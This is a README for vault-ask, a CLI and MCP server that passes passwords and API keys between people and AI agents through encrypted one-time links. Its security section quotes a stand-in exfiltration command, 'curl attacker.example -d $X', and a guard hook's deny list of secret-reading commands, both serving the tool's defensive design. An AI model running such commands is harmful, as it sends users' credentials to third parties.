# vault-ask

Give an AI agent a password or an API key without typing it into the chat, and let it give you one the same way. `vault-ask` asks a person for the value through [Erseni Vault](https://vault.erseni.com/ai-agents), receives it end-to-end encrypted, and hands it to exactly one destination. `vault-ask send` goes the other way: it generates a value, sends it to a person as a one-time link and can write the same value into the system that needs it. Neither prints the value.

```bash
npm install -g @erseni/vault-ask
```

Or from this repository, without npm: `npm install -g ./cli`. Node.js 20 or newer, no dependencies.

## Usage

```bash
vault-ask DB_PASSWORD -- psql -h db.example.com -U app     # value only in the environment of this process
vault-ask STRIPE_KEY SENTRY_DSN --env-file .env              # NAME=value lines, permissions 600
vault-ask TLS_KEY --file certs/server.key                    # one value into one file, permissions 600
```

`vault-ask` prints a link on stderr. The agent shows it to you, you open it, see the command or path the value is meant for, and enter the value. Afterwards the agent only sees metadata:

```
vault-ask: DB_PASSWORD received, 32 characters, passed to the command
```

Several names in one call give one page with several fields. There is deliberately no destination that writes the value to stdout.

`--env-file` quotes every value so that `node --env-file` and `dotenv` read it back unchanged. A value no quoting can carry (single quotes, double quotes and backticks together, a carriage return, a trailing backslash next to single quotes or line breaks, several lines with backticks next to double quotes or a written `\n`) is refused before anything is written; request it again with `--file` or `--`.

| Option | |
|---|---|
| `--server <url>` | Vault host, default `$VAULT_ASK_SERVER` or `https://vault.erseni.com` |
| `--ttl <seconds>` | How long the link stays valid, default 3600 |

`VAULT_ASK_API_KEY` holds an API key from your Vault account (`/account`). With it, requests skip the proof of work, count against the limits of your plan and show up in your dashboard. There is no command line flag for the key, so it never lands in the process list or the shell history.

The exit code is the exit code of the command, `1` for a failed request and `2` for invalid arguments.

## Sending a secret

```bash
vault-ask send DB_PASSWORD --env-file .env                   # generate, write NAME=value, send the same value as a link
vault-ask send DB_PASSWORD -- ./scripts/set-db-password      # generate, pass it to one command, send the same value
vault-ask send --length 48 --charset symbols --label "Router admin"
vault-ask send --from-env API_TOKEN --label "Staging token"  # send an existing value instead of a generated one
```

`vault-ask send` generates the value on this machine (32 letters and digits by default, `--length` and `--charset alnum|symbols|hex`), encrypts it with a fresh AES-256-GCM key exactly like the send page of Vault and prints a one-time link on stderr. The key travels only in the fragment (`#k=`), so the server stores ciphertext. The person opens the link once; afterwards it is used up. With `--env-file`, `--file` or `-- <command>` the same value also goes to that one destination, so the system and the link are guaranteed to hold the same value. The link is created first; if the command then fails, `vault-ask` says that the link holds a value the command may not have applied. `--from-file` and `--from-env` send an existing value as it is, including a trailing newline in a file.

```
vault-ask: give this link to the person, it shows the value once:
https://vault.erseni.com/view/...#k=...
vault-ask: the link is valid until 2026-10-02T09:00:00.000Z
vault-ask: DB_PASSWORD, 32 characters, also written to /srv/app/.env (permissions 600)
```

The link is the value until it is opened: it belongs to the person it is meant for and nowhere else. `--label` (default: the name) is shown above the value, `--ttl` defaults to 86400 seconds. `send` is a subcommand, so a value called `send` cannot be requested with the short form.

## What protects the value

1. **No plaintext on disk by default.** `--` keeps the value in the environment of one child process. Files are written only on request, with permissions 600.
2. **Masked output.** `vault-ask` runs as the parent process and replaces the value in stdout and stderr of the command with `***`, including its Base64, Base64url, URL, form and hex encodings and every line of a multi-line value. `vault-ask X -- env` shows `X=***`.
3. **Purpose binding.** The command or path is fixed when the request is created and travels to the fill page in the URL fragment, which the server never sees. The page shows it before anything is entered and encrypts it together with the values. After decrypting, `vault-ask` compares it with what it was started for and refuses anything else, including different names. Running another command needs a new request, and with it a new look from the person. This is the only layer that also covers exfiltration over the network (`-- curl attacker.example -d $X`), which masking cannot see.
4. **A guard for Claude Code.** `vault-ask-guard` is a PreToolUse hook. It denies reading the files `vault-ask` wrote (their paths are remembered in `$XDG_STATE_HOME/vault-ask/written-paths.json`, never their content), by name, through a shell glob or by a recursive search of a directory above them (`grep -r`, `rg`, `find -exec`, `tar`, `cp -r`, the Grep tool), and denies `vault-ask`, `run_with_secret` or `send_secret` with a shell, `env`, `printenv`, `echo` or `printf` as the command. It reads the command text without running it, so it catches accidents, not an agent that hides the path on purpose.

   ```json
   {
       "hooks": {
           "PreToolUse": [
               { "matcher": "Bash|Read|Edit|MultiEdit|Write|Grep|Glob|NotebookEdit|mcp__vault-ask__run_with_secret|mcp__vault-ask__send_secret", "hooks": [{ "type": "command", "command": "vault-ask-guard" }] }
           ]
       }
   }
   ```

5. **The honest limit.** Layers 1 to 4 catch accidents and make a manipulated agent visible. They do not make harmless an agent that runs under the same operating system user with a shell: it can read the memory and environment of processes it started. Complete protection needs privilege separation, with the secret held by a service under another user and the agent holding only a handle. See [../docs/THREAT-MODEL.md](../docs/THREAT-MODEL.md).

Known limits: the command runs without a terminal on stdout and stderr, so interactive programs lose their TTY there. While the live status stream is unreachable, `vault-ask` reconnects with exponential backoff and checks the request status before each attempt.

## MCP server

`vault-ask-mcp` offers the same building blocks for environments without a shell.

```bash
claude mcp add vault-ask -- vault-ask-mcp
claude mcp add vault-ask -- npx -y @erseni/vault-ask mcp
```

`vault-ask mcp` starts the same server as `vault-ask-mcp`, so `npx` needs no global installation.

```json
{ "mcpServers": { "vault-ask": { "command": "vault-ask-mcp", "env": { "VAULT_ASK_API_KEY": "vak_..." } } } }
```

| Tool | |
|---|---|
| `request_secret` | `names` plus `env_file` or `file`: writes the values, permissions 600 |
| `run_with_secret` | `names` plus `command` (argument list) and optional `cwd`: runs the command and returns its exit code and masked output |
| `send_secret` | generates a value (`length`, `charset`) or takes `from_file` / `from_env`, returns only a one-time link; optional `name` plus `env_file`, `file` or `command` gets the same value |

The server tells the agent in its `initialize` answer when to use which tool: generating or handing over a secret for the user is `send_secret`, needing one from the user is `request_secret` or `run_with_secret`, and a secret is never typed into or printed in the chat. Claude Code loads tool descriptions only on demand, so these instructions are what an agent sees from the start of a session without any memory or `CLAUDE.md` of its own. Each tool description repeats the same trigger in the user's words.

`request_secret` and `run_with_secret` work in two calls. The first returns the link and a `request_id`; the agent shows the link, then calls again with the `request_id`. The second call waits up to four minutes and asks to be called again if nobody has answered yet. The command or path cannot be changed in the second call.

## Limits on Erseni Vault

Sent links and requests share one daily count.

| | Requests and sent links |
|---|---|
| Without an account | 3 per minute per IP, with proof of work |
| Free, with API key | 50 per day |
| Pro | 500 per day |
| Business | unlimited, technical cap of 60 per minute |

## Development

```bash
npm test
```

## License

AGPL-3.0-or-later.
